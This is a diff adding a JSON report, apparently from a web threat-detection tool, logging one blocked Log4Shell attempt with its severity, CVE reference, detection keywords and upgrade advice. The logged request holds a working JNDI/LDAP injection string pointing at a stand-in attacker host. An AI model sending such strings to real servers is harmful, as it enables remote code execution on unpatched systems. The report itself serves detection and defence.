@@ -1,0 +1,30 @@
+{
+    "timestamp": "2025-12-27T18:20:56.321201",
+    "session_metrics": {
+        "response_time": "155.24s",
+        "mitigation_count": 1
+    },
+    "mitigated_threats": [
+        {
+            "id": 1001,
+            "timestamp": "18:18:13",
+            "created_at": 1766841493.1643412,
+            "raw_log": "18:18:11 GET /?x=${jndi:ldap://evil.com/exploit} HTTP/1.1 404",
+            "score": 95,
+            "severity": "Critical",
+            "patterns": [
+                "jndi",
+                "ldap"
+            ],
+            "context": {
+                "id": "CVE-2021-44228",
+                "vuln_name": "Log4Shell (Log4j RCE)",
+                "mitigation": "Upgrade Log4j to v2.17.1+. Set log4j2.formatMsgNoLookups=true. Block JNDI/LDAP outbound traffic.",
+                "citation": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
+                "severity": "Critical",
+                "confidence_score": 83.77
+            },
+            "mitigated_at": 1766841648.4029446
+        }
+    ]
+}
